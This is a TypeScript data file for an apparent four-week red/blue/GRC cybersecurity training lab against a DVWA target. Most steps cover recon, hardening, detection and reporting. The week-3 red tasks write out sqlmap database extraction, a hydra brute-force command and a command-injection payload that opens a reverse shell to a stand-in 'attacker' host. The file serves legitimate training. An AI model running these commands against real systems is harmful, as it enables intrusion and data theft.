import { Task, Week, Gate } from './types';

// Week Metadata
export const WEEKS: Record<number, Week> = {
  1: {
    number: 1,
    title: 'Cold Recon',
    theme: 'Build, connect, passive recon, baseline hardening',
    objective: 'Establish baseline, passive reconnaissance, and foundational security controls',
    runs: 'Run 01'
  },
  2: {
    number: 2,
    title: 'Hard Target',
    theme: 'Authorized vulnerability assessment + SOC detection engineering',
    objective: 'Perform vulnerability discovery and detection engineering',
    runs: 'Run 02'
  },
  3: {
    number: 3,
    title: 'The Breach',
    theme: 'Attack, detect, investigate, preserve evidence',
    objective: 'Execute authorized attacks and investigate findings',
    runs: 'Run 03'
  },
  4: {
    number: 4,
    title: 'Payday',
    theme: 'Report and present findings',
    objective: 'Compile and present final findings and recommendations',
    runs: 'Run 04'
  }
};

// Gates
export const GATES: Gate[] = [
  {
    id: 1,
    week: 1,
    title: 'Gate 1',
    description: 'Case + Scope authored',
    requiredArtifactTypes: ['case_overview', 'scope_document'],
    requiredTasks: ['red-w1-osint', 'blue-w1-hardening', 'grc-w1-framework']
  },
  {
    id: 2,
    week: 2,
    title: 'Gate 2',
    description: 'Hardening + Logs in place',
    requiredArtifactTypes: ['hardening_checklist', 'baseline_logs'],
    requiredTasks: ['blue-w2-baseline', 'red-w2-enumeration', 'grc-w2-risk']
  },
  {
    id: 3,
    week: 3,
    title: 'Gate 3',
    description: 'Findings + Evidence complete',
    requiredArtifactTypes: ['pcap', 'findings', 'evidence_log'],
    requiredTasks: ['red-w3-attacks', 'blue-w3-detection', 'grc-w3-custody']
  }
];

// RED (Runners) Tasks
const RED_TASKS: Task[] = [
  {
    id: 'red-w1-osint',
    role: 'red',
    week: 1,
    title: 'OSINT & Passive Recon',
    objective: 'Perform open-source intelligence gathering and passive reconnaissance to build an asset list.',
    frameworks: ['NIST_CSF'],
    deliverables: ['Asset_List.md', 'Recon_Findings.md'],
    steps: [
      {
        id: 'red-w1-s1',
        title: 'Verify Connectivity',
        description: 'Confirm network connectivity and record IP addresses.',
        command: 'ip a && ping -c 1 10.10.10.1',
        expectedOutput: 'eth0 inet 10.10.10.x, ping reply from target',
        whatItMeans: 'Your Kali box has network access to the target; both are on the same subnet.',
        frameworks: ['NIST_CSF']
      },
      {
        id: 'red-w1-s2',
        title: 'WHOIS & DNS Enumeration',
        description: 'Query domain registration and DNS records.',
        command: 'whois target.local && dig ANY target.local && nslookup -type=mx target.local',
        expectedOutput: 'Domain info, A/MX/NS records',
        whatItMeans: 'Reveals registered owner, mail servers, and DNS structure of the target.',
        frameworks: ['NIST_CSF', 'CIS']
      },
      {
        id: 'red-w1-s3',
        title: 'Web Tech Discovery',
        description: 'Identify web technologies, frameworks, and versions.',
        command: 'whatweb http://10.10.10.x',
        expectedOutput: 'Apache version, PHP version, technologies used',
        whatItMeans: 'Identifies specific software versions which may have known vulnerabilities.',
        frameworks: ['CIS', 'OWASP'],
        isEvidenceStep: true
      },
      {
        id: 'red-w1-s4',
        title: 'Email/Host Discovery',
        description: 'Gather email addresses and host information.',
        command: 'theHarvester -d target.local -b all',
        expectedOutput: 'Email list, subdomains, hosts',
        whatItMeans: 'Identifies potential usernames and infrastructure assets.',
        frameworks: ['NIST_CSF']
      },
      {
        id: 'red-w1-s5',
        title: 'Export to Asset List',
        description: 'Compile findings into Asset_List artifact.',
        command: 'cat > Asset_List.md << EOF\n# Discovered Assets\n- IP Range: 10.10.10.0/24\n- Services: SSH, HTTP, DNS\nEOF',
        expectedOutput: 'Asset_List.md created',
        whatItMeans: 'Creates reusable documentation for GRC governance and risk assessment.',
        frameworks: ['NIST_CSF'],
        isEvidenceStep: true
      }
    ]
  },
  {
    id: 'red-w2-enumeration',
    role: 'red',
    week: 2,
    title: 'Vulnerability Discovery',
    objective: 'Perform authorized vulnerability enumeration using network and web scanning.',
    frameworks: ['NIST_CSF', 'CIS', 'OWASP'],
    deliverables: ['Nmap_Scan.txt', 'Nikto_Report.txt', 'Vulnerability_Summary.md'],
    steps: [
      {
        id: 'red-w2-s1',
        title: 'Network Scan - All Ports',
        description: 'Scan all TCP ports with version detection.',
        command: 'nmap -sV -p- 10.10.10.5 > nmap_full.txt',
        expectedOutput: 'Port list with service versions',
        whatItMeans: 'Discovers all listening network services and their versions.',
        frameworks: ['CIS'],
        isEvidenceStep: true
      },
      {
        id: 'red-w2-s2',
        title: 'Web Vulnerability Scan',
        description: 'Run automated web scanner against target.',
        command: 'nikto -h http://10.10.10.5 -o nikto_report.txt',
        expectedOutput: 'Vulnerabilities: directory indexing, default files, old software',
        whatItMeans: 'Identifies common web misconfigurations and known web vulnerabilities.',
        frameworks: ['OWASP'],
        isEvidenceStep: true
      },
      {
        id: 'red-w2-s3',
        title: 'SSH Auth Methods',
        description: 'Identify authentication methods on SSH.',
        command: 'nmap --script ssh-auth-methods 10.10.10.5',
        expectedOutput: 'SSH allows password auth',
        whatItMeans: 'Password auth enabled = brute force risk; SSH key only would be better.',
        frameworks: ['CIS']
      }
    ]
  },
  {
    id: 'red-w3-attacks',
    role: 'red',
    week: 3,
    title: 'Authorized Attacks & Evidence',
    objective: 'Execute one well-documented exploit chain with complete evidence trail.',
    frameworks: ['OWASP', 'NIST_800_61', 'CVSS'],
    deliverables: ['SQL_Injection_Proof.txt', 'Brute_Force_Proof.txt', 'Reverse_Shell_Proof.txt', 'Evidence_Photos.zip'],
    steps: [
      {
        id: 'red-w3-s1',
        title: 'SQL Injection Attack',
        description: 'Exploit SQL injection vulnerability in DVWA.',
        command: 'sqlmap -u http://10.10.10.5/DVWA/vulnerabilities/sqli/ --auth-creds=admin:password --dbs',
        expectedOutput: 'Database list, users table extracted',
        whatItMeans: 'Demonstrates data exfiltration risk from SQL injection.',
        frameworks: ['OWASP'],
        isEvidenceStep: true
      },
      {
        id: 'red-w3-s2',
        title: 'Brute Force Attack',
        description: 'Attack login form with hydra.',
        command: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form://10.10.10.5/login.php:username=^USER^&password=^PASS^:S=Welcome',
        expectedOutput: 'Credentials found',
        whatItMeans: 'Shows weak password vulnerability and lack of account lockout.',
        frameworks: ['CIS', 'OWASP'],
        isEvidenceStep: true
      },
      {
        id: 'red-w3-s3',
        title: 'Command Injection & Reverse Shell',
        description: 'Inject command and establish reverse shell.',
        command: 'nc -lvnp 4444 & echo "Payload: 127.0.0.1 | nc -c /bin/bash attacker 4444" > /dev/clipboard',
        expectedOutput: 'Reverse shell connection established; id command shows www-data',
        whatItMeans: 'Demonstrates RCE and full system compromise.',
        frameworks: ['OWASP'],
        isEvidenceStep: true
      },
      {
        id: 'red-w3-s4',
        title: 'Screenshot Evidence',
        description: 'Capture proof of successful exploitation.',
        command: 'screenshot named YYYYMMDD_TeamXX_Tool_Action.png',
        expectedOutput: 'Evidence file created with naming convention',
        whatItMeans: 'Documented proof required by GRC for compliance and reporting.',
        frameworks: ['NIST_800_61'],
        isEvidenceStep: true
      }
    ]
  },
  {
    id: 'red-w4-briefing',
    role: 'red',
    week: 4,
    title: 'Technical Findings Briefing',
    objective: 'Present technical exploits and findings in plain English to stakeholders.',
    frameworks: ['ISO_27001', 'NIST_CSF'],
    deliverables: ['Technical_Explanation.md', 'Briefing_Slides_Part1.pptx'],
    steps: [
      {
        id: 'red-w4-s1',
        title: 'Review Attack Timeline',
        description: 'Prepare chronological attack narrative.',
        command: 'cat timeline.txt',
        expectedOutput: 'Clear sequence of events',
        whatItMeans: 'Tells the story of how the compromise occurred.',
        frameworks: ['ISO_27001']
      },
      {
        id: 'red-w4-s2',
        title: 'Explain Each Finding',
        description: 'Document what each exploit revealed and its impact.',
        command: 'echo "SQL Injection = Unauthorized data access" >> findings_explained.txt',
        expectedOutput: 'Plain language explanations',
        whatItMeans: 'Non-technical stakeholders understand the risk.',
        frameworks: ['ISO_27001']
      }
    ]
  }
];

// BLUE (Wardens) Tasks
const BLUE_TASKS: Task[] = [
  {
    id: 'blue-w1-hardening',
    role: 'blue',
    week: 1,
    title: 'Baseline Hardening',
    objective: 'Harden the DVWA server with essential security controls.',
    frameworks: ['NIST_CSF', 'CIS'],
    deliverables: ['Hardening_Checklist.txt', 'UFW_Status.txt', 'Lynis_Report.html'],
    steps: [
      {
        id: 'blue-w1-s1',
        title: 'SSH Into Target',
        description: 'Establish secure connection to target server.',
        command: 'ssh user@10.10.10.5',
        expectedOutput: 'Shell prompt; whoami shows non-root user',
        whatItMeans: 'You are connected as non-root (good security), can now apply hardening.',
        frameworks: ['NIST_CSF']
      },
      {
        id: 'blue-w1-s2',
        title: 'Update System',
        description: 'Apply latest security patches.',
        command: 'sudo apt update && sudo apt upgrade -y',
        expectedOutput: 'Packages updated',
        whatItMeans: 'Patches known vulnerabilities in OS and applications.',
        frameworks: ['CIS']
      },
      {
        id: 'blue-w1-s3',
        title: 'Configure Firewall',
        description: 'Enable UFW and allow only SSH and HTTP.',
        command: 'sudo ufw default deny incoming && sudo ufw allow 22 && sudo ufw allow 80 && sudo ufw enable',
        expectedOutput: 'UFW enabled, status shows SSH and HTTP allowed',
        whatItMeans: 'Restricts inbound traffic to only necessary services.',
        frameworks: ['CIS'],
        isEvidenceStep: true
      },
      {
        id: 'blue-w1-s4',
        title: 'Install Fail2Ban',
        description: 'Protect against brute force attacks.',
        command: 'sudo apt install fail2ban && sudo systemctl enable fail2ban',
        expectedOutput: 'Fail2Ban running and enabled',
        whatItMeans: 'Automatically blocks repeated failed login attempts.',
        frameworks: ['CIS'],
        isEvidenceStep: true
      },
      {
        id: 'blue-w1-s5',
        title: 'System Audit with Lynis',
        description: 'Run comprehensive security audit.',
        command: 'sudo lynis audit system > lynis_report.txt',
        expectedOutput: 'Hardening index score, warnings list',
        whatItMeans: 'Identifies remaining security gaps and compliance issues.',
        frameworks: ['NIST_CSF'],
        isEvidenceStep: true
      }
    ]
  },
  {
    id: 'blue-w2-baseline',
    role: 'blue',
    week: 2,
    title: 'Baseline Capture & Detection Engineering',
    objective: 'Capture normal traffic and design detection rules for attacks.',
    frameworks: ['NIST_CSF', 'NIST_800_115'],
    deliverables: ['Baseline_Traffic.pcap', 'Attack_Traffic.pcap', 'Wireshark_Filters.txt', 'Detection_Rules.txt'],
    steps: [
      {
        id: 'blue-w2-s1',
        title: 'Capture Normal Traffic',
        description: 'Record baseline traffic while accessing application normally.',
        command: 'sudo tcpdump -i eth0 -w baseline.pcap',
        expectedOutput: 'PCAP file with normal HTTP requests',
        whatItMeans: 'Establishes pattern of legitimate traffic for comparison.',
        frameworks: ['NIST_800_115'],
        isEvidenceStep: true
      },
      {
        id: 'blue-w2-s2',
        title: 'Analyze Baseline in Wireshark',
        description: 'Study normal traffic patterns and timing.',
        command: 'wireshark baseline.pcap & # Filter: http.request',
        expectedOutput: 'Sequential requests, normal request rate, complete handshakes',
        whatItMeans: 'Understand what normal looks like to detect anomalies.',
        frameworks: ['NIST_CSF']
      },
      {
        id: 'blue-w2-s3',
        title: 'Create Detection Filters',
        description: 'Write Wireshark filters for common attack patterns.',
        command: 'echo "Filter 1: tcp.flags.syn==1 && tcp.flags.ack==0 (SYN scan)" > detection_filters.txt',
        expectedOutput: 'List of Wireshark filters',
        whatItMeans: 'Filters enable rapid identification of suspicious activity.',
        frameworks: ['NIST_CSF'],
        isEvidenceStep: true
      }
    ]
  },
  {
    id: 'blue-w3-detection',
    role: 'blue',
    week: 3,
    title: 'Live Detection & Response',
    objective: 'Detect attacks as they happen and respond with containment.',
    frameworks: ['NIST_CSF', 'NIST_800_61'],
    deliverables: ['Attack_Pcap.pcap', 'Attack_Logs.txt', 'Incident_Response.txt', 'Containment_Actions.txt'],
    steps: [
      {
        id: 'blue-w3-s1',
        title: 'Start Live Packet Capture',
        description: 'Begin recording before Red starts attacks.',
        command: 'sudo tcpdump -i eth0 -w attack_capture.pcap',
        expectedOutput: 'Capture running, file growing',
        whatItMeans: 'Forensic evidence collection; chain of custody begins.',
        frameworks: ['NIST_800_61'],
        isEvidenceStep: true
      },
      {
        id: 'blue-w3-s2',
        title: 'Monitor Logs in Real Time',
        description: 'Watch system and web server logs.',
        command: 'tail -f /var/log/apache2/access.log',
        expectedOutput: 'HTTP requests, errors, failed auth attempts',
        whatItMeans: 'Real-time visibility into attacker activity.',
        frameworks: ['NIST_CSF'],
        isEvidenceStep: true
      },
      {
        id: 'blue-w3-s3',
        title: 'Detect SQL Injection Pattern',
        description: 'Identify SQL injection attempt in logs.',
        command: 'grep -i "union\\|select" /var/log/apache2/access.log',
        expectedOutput: 'SQL keywords in request URLs',
        whatItMeans: 'Confirms SQL injection attack attempt.',
        frameworks: ['OWASP', 'NIST_800_61'],
        isEvidenceStep: true
      },
      {
        id: 'blue-w3-s4',
        title: 'Block Attacker IP',
        description: 'Use firewall to deny further traffic from attacker.',
        command: 'sudo ufw deny from 10.10.10.x',
        expectedOutput: 'UFW rule added',
        whatItMeans: 'Containment action stops ongoing attacks.',
        frameworks: ['NIST_800_61']
      }
    ]
  },
  {
    id: 'blue-w4-response',
    role: 'blue',
    week: 4,
    title: 'Incident Response Findings',
    objective: 'Present detection engineering and response actions.',
    frameworks: ['NIST_800_61', 'NIST_CSF'],
    deliverables: ['Detection_Summary.md', 'Response_Timeline.md', 'Briefing_Slides_Part2.pptx'],
    steps: [
      {
        id: 'blue-w4-s1',
        title: 'Compile Detection Evidence',
        description: 'Document what was detected and when.',
        command: 'cat > detection_summary.md << EOF\n# Detection Timeline\n- 14:23:45: SYN scan detected\n- 14:25:12: SQL injection attempt\nEOF',
        expectedOutput: 'Timeline created',
        whatItMeans: 'Shows detection capability and speed of response.',
        frameworks: ['NIST_800_61']
      }
    ]
  }
];

// GRC (Fixers) Tasks
const GRC_TASKS: Task[] = [
  {
    id: 'grc-w1-framework',
    role: 'grc',
    week: 1,
    title: 'Framework Mapping & Policy',
    objective: 'Map baseline findings to security frameworks and draft policy.',
    frameworks: ['NIST_CSF', 'CIS', 'STRIDE'],
    deliverables: ['Framework_Mapping.md', 'Lab_Security_Policy_v1.0.md'],
    steps: [
      {
        id: 'grc-w1-s1',
        title: 'Review Red & Blue Findings',
        description: 'Gather all Week 1 artifacts from teammates.',
        command: 'ls /shared/team-artifacts/week-1/',
        expectedOutput: 'Asset_List.md, Hardening_Checklist.txt',
        whatItMeans: 'Inventory of discoveries and controls implemented.',
        frameworks: ['NIST_CSF']
      },
      {
        id: 'grc-w1-s2',
        title: 'Map to NIST CSF ID.AM',
        description: 'Link findings to NIST CSF Asset Management controls.',
        command: 'cat > framework_mapping.txt << EOF\nID.AM-1: Asset inventory = Asset_List.md\nEOF',
        expectedOutput: 'Mapping document',
        whatItMeans: 'Demonstrates compliance with security framework.',
        frameworks: ['NIST_CSF'],
        isEvidenceStep: true
      },
      {
        id: 'grc-w1-s3',
        title: 'Map to CIS Controls',
        description: 'Link to CIS Critical Security Controls.',
        command: 'echo "CIS-1: Firewall configured = UFW" >> cis_mapping.txt',
        expectedOutput: 'CIS mapping created',
        whatItMeans: 'Aligns with industry best practices.',
        frameworks: ['CIS'],
        isEvidenceStep: true
      },
      {
        id: 'grc-w1-s4',
        title: 'Draft Security Policy v1.0',
        description: 'Create baseline policy document.',
        command: 'cat > Lab_Security_Policy_v1.0.md << EOF\n# Lab Security Policy\n- No root login over SSH\n- Firewall required\n- Logging enabled\nEOF',
        expectedOutput: 'Policy document created',
        whatItMeans: 'Formal policy enforces controls and expectations.',
        frameworks: ['ISO_27001'],
        isEvidenceStep: true
      }
    ]
  },
  {
    id: 'grc-w2-risk',
    role: 'grc',
    week: 2,
    title: 'Risk Matrix & Assessment',
    objective: 'Build risk matrix from vulnerability assessment results.',
    frameworks: ['NIST_CSF', 'CVSS'],
    deliverables: ['Risk_Matrix.md', 'Vulnerability_Assessment.md'],
    steps: [
      {
        id: 'grc-w2-s1',
        title: 'Collect Vulnerability Data',
        description: 'Gather nmap and nikto results from Red.',
        command: 'cat Red_w2_findings.txt',
        expectedOutput: 'Vulnerability list with descriptions',
        whatItMeans: 'Input for risk calculation.',
        frameworks: ['NIST_CSF']
      },
      {
        id: 'grc-w2-s2',
        title: 'Create Risk Matrix',
        description: 'Build Likelihood × Impact matrix.',
        command: 'cat > risk_matrix.md << EOF\n| Vuln | Likelihood | Impact | Risk |\n| SSH Password | High | High | Critical |\nEOF',
        expectedOutput: 'Risk matrix table',
        whatItMeans: 'Prioritizes risks for remediation.',
        frameworks: ['NIST_CSF'],
        isEvidenceStep: true
      },
      {
        id: 'grc-w2-s3',
        title: 'Assign CVSS Scores',
        description: 'Calculate CVSS severity for each vulnerability.',
        command: 'echo "SSH Brute Force: CVSS 7.5 (High)" >> cvss_scores.txt',
        expectedOutput: 'CVSS scores assigned',
        whatItMeans: 'Standardized severity helps prioritization.',
        frameworks: ['CVSS'],
        isEvidenceStep: true
      }
    ]
  },
  {
    id: 'grc-w3-custody',
    role: 'grc',
    week: 3,
    title: 'Evidence & Chain of Custody',
    objective: 'Document and verify evidence integrity.',
    frameworks: ['NIST_800_61', 'ISO_27001'],
    deliverables: ['Evidence_Log.md', 'Chain_of_Custody.txt', 'Findings_Summary.md'],
    steps: [
      {
        id: 'grc-w3-s1',
        title: 'Receive Artifacts from Team',
        description: 'Collect all evidence from Red and Blue.',
        command: 'ls -la /team-artifacts/week-3/ | tee artifact_log.txt',
        expectedOutput: 'File list with timestamps',
        whatItMeans: 'Inventory of all evidence collected.',
        frameworks: ['NIST_800_61']
      },
      {
        id: 'grc-w3-s2',
        title: 'Hash Evidence Files',
        description: 'Create SHA256 hashes for integrity verification.',
        command: 'sha256sum attack_capture.pcap Blue_w3_logs.txt Red_w3_proof.pdf > evidence_hashes.txt',
        expectedOutput: 'Hash file created',
        whatItMeans: 'Proves evidence has not been tampered with.',
        frameworks: ['NIST_800_61'],
        isEvidenceStep: true
      },
      {
        id: 'grc-w3-s3',
        title: 'Create Evidence Log',
        description: 'Document who collected each piece of evidence.',
        command: 'cat > evidence_log.md << EOF\n# Evidence Log\n| Item | Collected By | Date | SHA256 |\nEOF',
        expectedOutput: 'Evidence log created',
        whatItMeans: 'Chain of custody required for forensics.',
        frameworks: ['NIST_800_61'],
        isEvidenceStep: true
      },
      {
        id: 'grc-w3-s4',
        title: 'Compile Team Package',
        description: 'Bundle all evidence for final report.',
        command: 'tar -czf Team_Capstone_Week3.tar.gz *.md *.txt *.pcap',
        expectedOutput: 'Archive created',
        whatItMeans: 'Deliverable ready for grading.',
        frameworks: ['ISO_27001']
      }
    ]
  },
  {
    id: 'grc-w4-report',
    role: 'grc',
    week: 4,
    title: 'Final Report & Presentation',
    objective: 'Compile and present all findings, recommendations, and incident response.',
    frameworks: ['ISO_27001', 'NIST_CSF'],
    deliverables: ['Final_Report.pdf', 'Findings.md', 'Recommendations.md', 'Briefing_Slides.pptx'],
    steps: [
      {
        id: 'grc-w4-s1',
        title: 'Compile Findings Document',
        description: 'Aggregate findings from all three gates.',
        command: 'cat > findings.md << EOF\n# Findings Summary\n## Critical\n- SSH Password Authentication\n## High\n- SQL Injection Vulnerability\nEOF',
        expectedOutput: 'Findings document',
        whatItMeans: 'Comprehensive vulnerability report.',
        frameworks: ['ISO_27001']
      },
      {
        id: 'grc-w4-s2',
        title: 'Create Recommendations',
        description: 'Propose mitigations and controls.',
        command: 'cat > recommendations.md << EOF\n# Recommendations\n1. Require SSH key-only authentication\n2. Implement WAF for web application\n3. Deploy vulnerability management program\nEOF',
        expectedOutput: 'Recommendations list',
        whatItMeans: 'Actionable steps to reduce risk.',
        frameworks: ['NIST_CSF']
      },
      {
        id: 'grc-w4-s3',
        title: 'Compile Final Report',
        description: 'Merge all sections into final report.',
        command: 'pandoc *.md -o Final_Report.pdf',
        expectedOutput: 'PDF report created',
        whatItMeans: 'Professional deliverable for stakeholders.',
        frameworks: ['ISO_27001'],
        isEvidenceStep: true
      }
    ]
  }
];

// Maps each evidence step to the deliverable file it contributes toward.
// Used by the guided task runner to show "this step produces <file>".
export const STEP_DELIVERABLES: Record<string, string> = {
  // Red
  'red-w1-s3': 'Recon_Findings.md',
  'red-w1-s5': 'Asset_List.md',
  'red-w2-s1': 'Nmap_Scan.txt',
  'red-w2-s2': 'Nikto_Report.txt',
  'red-w3-s1': 'SQL_Injection_Proof.txt',
  'red-w3-s2': 'Brute_Force_Proof.txt',
  'red-w3-s3': 'Reverse_Shell_Proof.txt',
  'red-w3-s4': 'Evidence_Photos.zip',
  // Blue
  'blue-w1-s3': 'UFW_Status.txt',
  'blue-w1-s4': 'Hardening_Checklist.txt',
  'blue-w1-s5': 'Lynis_Report.html',
  'blue-w2-s1': 'Baseline_Traffic.pcap',
  'blue-w2-s3': 'Detection_Rules.txt',
  'blue-w3-s1': 'Attack_Pcap.pcap',
  'blue-w3-s2': 'Attack_Logs.txt',
  'blue-w3-s3': 'Incident_Response.txt',
  // GRC
  'grc-w1-s2': 'Framework_Mapping.md',
  'grc-w1-s3': 'Framework_Mapping.md',
  'grc-w1-s4': 'Lab_Security_Policy_v1.0.md',
  'grc-w2-s2': 'Risk_Matrix.md',
  'grc-w2-s3': 'Vulnerability_Assessment.md',
  'grc-w3-s2': 'Evidence_Log.md',
  'grc-w3-s3': 'Evidence_Log.md',
  'grc-w4-s3': 'Final_Report.pdf',
};

export function getStepDeliverable(stepId: string): string | undefined {
  return STEP_DELIVERABLES[stepId];
}

// All deliverable filenames expected from a role for a given week.
export function getDeliverablesForWeek(role: 'red' | 'blue' | 'grc', week: number): string[] {
  const tasks = getTasksByRole(role, week);
  const set = new Set<string>();
  tasks.forEach((t) => t.deliverables.forEach((d) => set.add(d)));
  return Array.from(set);
}

// Export all tasks
export const ALL_TASKS: Task[] = [...RED_TASKS, ...BLUE_TASKS, ...GRC_TASKS];

export function getTasksByRole(role: 'red' | 'blue' | 'grc', week?: number): Task[] {
  let tasks = ALL_TASKS.filter(t => t.role === role);
  if (week) {
    tasks = tasks.filter(t => t.week === week);
  }
  return tasks;
}

export function getTaskById(id: string): Task | undefined {
  return ALL_TASKS.find(t => t.id === id);
}

export function getWeekTasks(week: number): Task[] {
  return ALL_TASKS.filter(t => t.week === week);
}
